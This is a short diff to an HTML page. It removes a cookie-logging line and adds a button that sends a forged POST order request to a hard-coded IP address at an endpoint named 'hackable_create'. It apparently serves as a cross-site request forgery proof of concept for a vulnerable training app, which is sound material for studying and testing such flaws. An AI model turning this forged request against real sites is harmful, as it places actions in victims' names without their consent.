@@ -4,7 +4,22 @@
     <script type="text/javascript" src="libraries/jquery.min.js"></script>
     <script type="text/javascript" src="libraries/jquery.cookie.js"></script>
     <script>
-        console.log($.cookie('user_token'));
+function send() {
+    $.ajax({
+        type: "POST",
+        url: "http://81.228.201.233/api/orders.php?action=hackable_create",
+        data: {
+            "total": "1.2",
+            "products": {
+                "1": 1
+            }
+        },
+        datatype: "json"
+    });
+}
     </script>
 </head>
+<body>
+    <input type="button" onclick="send()" value="Send data!">
+</body>
 </html>
